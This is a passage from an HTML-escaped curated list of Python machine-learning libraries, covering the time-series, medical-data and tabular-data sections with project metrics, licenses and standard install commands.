31.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install auto-ts&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/firmai/atspy&#34;&gt;atspy&lt;/a&gt;&lt;/b&gt; (🥉16 · ⭐ 440) - AtsPy: Automated Time Series Models in Python (by @firmai). &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/firmai/atspy&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 5 · 🔀 85 · 📦 6 · 📋 20 - 90% open · ⏱️ 18.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/firmai/atspy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/atspy&#34;&gt;PyPi&lt;/a&gt; (📥 2.3K / month · ⏱️ 24.04.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install atspy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;Show 9 hidden projects...&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/RJT1990/pyflux&#34;&gt;PyFlux&lt;/a&gt;&lt;/b&gt; (🥈25 · ⭐ 2K · 💀) - Open source time series library for Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/linkedin/luminol&#34;&gt;luminol&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 1K · 💀) - Anomaly Detection and Correlation library. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/dmbee/seglearn&#34;&gt;seglearn&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 520 · 💀) - Python module for machine learning time series:. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/X-DataInitiative/tick&#34;&gt;tick&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 380 · 💀) - Module for statistical learning, with a particular emphasis on time-.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/Nixtla/neuralforecast&#34;&gt;NeuralForecast&lt;/a&gt;&lt;/b&gt; (🥉20 · ⭐ 610) - Scalable and user friendly neural forecasting algorithms.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/2M0xdwT&#34;&gt;❗️GPL-3.0&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/wwrechard/pydlm&#34;&gt;pydlm&lt;/a&gt;&lt;/b&gt; (🥉20 · ⭐ 420 · 💀) - A python library for Bayesian time series modeling. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/arundo/adtk&#34;&gt;ADTK&lt;/a&gt;&lt;/b&gt; (🥉19 · ⭐ 820 · 💀) - A Python toolkit for rule-based/unsupervised anomaly detection in time.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3postzC&#34;&gt;MPL-2.0&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/target/matrixprofile-ts&#34;&gt;matrixprofile-ts&lt;/a&gt;&lt;/b&gt; (🥉19 · ⭐ 680 · 💀) - A Python library for detecting patterns and anomalies.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/arundo/tsaug&#34;&gt;tsaug&lt;/a&gt;&lt;/b&gt; (🥉14 · ⭐ 240 · 💀) - A Python package for time series augmentation. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;br&gt; &#xA;&lt;h2&gt;Medical Data&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#contents&#34;&gt;&lt;img align=&#34;right&#34; width=&#34;15&#34; height=&#34;15&#34; src=&#34;https://git.io/JtehR&#34; alt=&#34;Back to top&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Libraries for processing and analyzing medical data such as MRIs, EEGs, genomic data, and other medical imaging formats.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/mne-tools/mne-python&#34;&gt;MNE&lt;/a&gt;&lt;/b&gt; (🥇36 · ⭐ 1.9K) - MNE: Magnetoencephalography (MEG) and Electroencephalography (EEG) in Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/mne-tools/mne-python&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 290 · 🔀 1K · 📦 1.6K · 📋 4.1K - 9% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/mne-tools/mne-python&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/mne&#34;&gt;PyPi&lt;/a&gt; (📥 51K / month · 📦 210 · ⏱️ 12.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install mne&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/mne&#34;&gt;Conda&lt;/a&gt; (📥 200K · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge mne&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/nilearn/nilearn&#34;&gt;Nilearn&lt;/a&gt;&lt;/b&gt; (🥇35 · ⭐ 860) - Machine learning for NeuroImaging in Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/nilearn/nilearn&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 180 · 🔀 460 · 📥 58 · 📦 1.5K · 📋 1.6K - 17% open · ⏱️ 23.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/nilearn/nilearn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/nilearn&#34;&gt;PyPi&lt;/a&gt; (📥 21K / month · 📦 240 · ⏱️ 13.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install nilearn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/nilearn&#34;&gt;Conda&lt;/a&gt; (📥 150K · ⏱️ 13.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge nilearn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/nipy/nipype&#34;&gt;NIPYPE&lt;/a&gt;&lt;/b&gt; (🥈34 · ⭐ 630 · 📉) - Workflows and interfaces for neuroimaging packages. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/nipy/nipype&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 240 · 🔀 490 · 📦 930 · 📋 1.3K - 29% open · ⏱️ 16.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/nipy/nipype&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/nipype&#34;&gt;PyPi&lt;/a&gt; (📥 51K / month · 📦 160 · ⏱️ 16.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install nipype&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/nipype&#34;&gt;Conda&lt;/a&gt; (📥 470K · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge nipype&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/Project-MONAI/MONAI&#34;&gt;MONAI&lt;/a&gt;&lt;/b&gt; (🥈33 · ⭐ 3K) - AI Toolkit for Healthcare Imaging. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/Project-MONAI/MONAI&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 96 · 🔀 590 · 📦 320 · 📋 1.7K - 12% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/Project-MONAI/MONAI&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/monai&#34;&gt;PyPi&lt;/a&gt; (📥 50K / month · 📦 17 · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install monai&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/monai&#34;&gt;Conda&lt;/a&gt; (📥 670 · ⏱️ 09.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge monai&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/CamDavidsonPilon/lifelines&#34;&gt;Lifelines&lt;/a&gt;&lt;/b&gt; (🥈33 · ⭐ 1.9K) - Survival analysis in Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/CamDavidsonPilon/lifelines&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 100 · 🔀 470 · 📦 890 · 📋 860 - 26% open · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/CamDavidsonPilon/lifelines&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/lifelines&#34;&gt;PyPi&lt;/a&gt; (📥 330K / month · 📦 110 · ⏱️ 15.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install lifelines&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/lifelines&#34;&gt;Conda&lt;/a&gt; (📥 190K · ⏱️ 18.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge lifelines&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/hail-is/hail&#34;&gt;Hail&lt;/a&gt;&lt;/b&gt; (🥈33 · ⭐ 800) - Scalable genomic data analysis. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1N&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/hail-is/hail&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 79 · 🔀 210 · 📦 68 · 📋 2K - 2% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/hail-is/hail&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/hail&#34;&gt;PyPi&lt;/a&gt; (📥 33K / month · 📦 11 · ⏱️ 16.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install hail&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/nipy/nibabel&#34;&gt;NiBabel&lt;/a&gt;&lt;/b&gt; (🥈33 · ⭐ 470) - Python package to access a cacophony of neuro-imaging file formats. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/nipy/nibabel&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 95 · 🔀 230 · 📦 7.2K · 📋 460 - 30% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/nipy/nibabel&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/nibabel&#34;&gt;PyPi&lt;/a&gt; (📥 180K / month · 📦 970 · ⏱️ 07.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install nibabel&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/nibabel&#34;&gt;Conda&lt;/a&gt; (📥 430K · ⏱️ 07.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge nibabel&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/dipy/dipy&#34;&gt;DIPY&lt;/a&gt;&lt;/b&gt; (🥈31 · ⭐ 510) - DIPY is the paragon 3D/4D+ imaging library in Python. Contains generic.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/dipy/dipy&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 130 · 🔀 360 · 📦 560 · 📋 810 - 18% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/dipy/dipy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/dipy&#34;&gt;PyPi&lt;/a&gt; (📥 12K / month · 📦 80 · ⏱️ 11.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install dipy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/dipy&#34;&gt;Conda&lt;/a&gt; (📥 300K · ⏱️ 15.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge dipy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/google/deepvariant&#34;&gt;DeepVariant&lt;/a&gt;&lt;/b&gt; (🥉25 · ⭐ 2.5K) - DeepVariant is an analysis pipeline that uses a deep neural.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/google/deepvariant&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 21 · 🔀 610 · 📥 3.9K · 📋 490 - 0% open · ⏱️ 28.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/google/deepvariant&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/bioconda/deepvariant&#34;&gt;Conda&lt;/a&gt; (📥 41K · ⏱️ 16.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c bioconda deepvariant&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/MIC-DKFZ/medicaldetectiontoolkit&#34;&gt;Medical Detection Toolkit&lt;/a&gt;&lt;/b&gt; (🥉14 · ⭐ 1.1K) - The Medical Detection Toolkit contains 2D + 3D.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/MIC-DKFZ/medicaldetectiontoolkit&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 3 · 🔀 290 · 📋 130 - 33% open · ⏱️ 04.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/MIC-DKFZ/medicaldetectiontoolkit&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;Show 9 hidden projects...&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/NifTK/NiftyNet&#34;&gt;NiftyNet&lt;/a&gt;&lt;/b&gt; (🥉25 · ⭐ 1.3K · 💀) - [unmaintained] An open-source convolutional neural.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/nipy/nipy&#34;&gt;NIPY&lt;/a&gt;&lt;/b&gt; (🥉23 · ⭐ 320 · 💀) - Neuroimaging in Python FMRI analysis package. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/projectglow/glow&#34;&gt;Glow&lt;/a&gt;&lt;/b&gt; (🥉23 · ⭐ 200) - An open-source toolkit for large-scale genomic analysis. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/DLTK/DLTK&#34;&gt;DLTK&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 1.3K · 💀) - Deep Learning Toolkit for Medical Image Analysis. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/loli/medpy&#34;&gt;MedPy&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 410 · 💀) - Medical image processing in Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/2M0xdwT&#34;&gt;❗️GPL-3.0&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/brainiak/brainiak&#34;&gt;Brainiak&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 270 · 💤) - Brain Imaging Analysis Kit. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/perone/medicaltorch&#34;&gt;MedicalTorch&lt;/a&gt;&lt;/b&gt; (🥉17 · ⭐ 780 · 💀) - A medical imaging framework for Pytorch. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/QTIM-Lab/DeepNeuro&#34;&gt;DeepNeuro&lt;/a&gt;&lt;/b&gt; (🥉13 · ⭐ 110 · 💀) - A deep learning python package for neuroimaging data. Made by:. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/Tencent/MedicalNet&#34;&gt;MedicalNet&lt;/a&gt;&lt;/b&gt; (🥉12 · ⭐ 1.4K · 💀) - Many studies have shown that the performance on deep learning is.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;br&gt; &#xA;&lt;h2&gt;Tabular Data&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#contents&#34;&gt;&lt;img align=&#34;right&#34; width=&#34;15&#34; height=&#34;15&#34; src=&#34;https://git.io/JtehR&#34; alt=&#34;Back to top&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Libraries for processing tabular and structured data.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/carefree0910/carefree-learn&#34;&gt;carefree-learn&lt;/a&gt;&lt;/b&gt; (🥈19 · ⭐ 360) - Deep Learning PyTorch. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/carefree0910/carefree-learn&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 1 · 🔀 33 · 📦 2 · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/carefree0910/carefree-learn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/carefree-learn&#34;&gt;PyPi&lt;/a&gt; (📥 120 / month · ⏱️ 29.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install carefree-learn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/manujosephv/pytorch_tabular&#34;&gt;pytorch_tabular&lt;/a&gt;&lt;/b&gt; (🥉17 · ⭐ 590) - A standard framework for modelling Deep Learning Models.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/manujosephv/pytorch_tabular&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 9 · 🔀 61 · 📋 60 - 26% open · ⏱️ 30.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/manujosephv/pytorch_tabular&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pytorch_tabular&#34;&gt;PyPi&lt;/a&gt; (📥 2K / month · 📦 1 · ⏱️ 01.09.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pytorch_tabular&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/firmai/deltapy&#34;&gt;deltapy&lt;/a&gt;&lt;/b&gt; (🥉11 · ⭐ 430) - DeltaPy - Tabular Data Augmentation (by @firmai). &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a 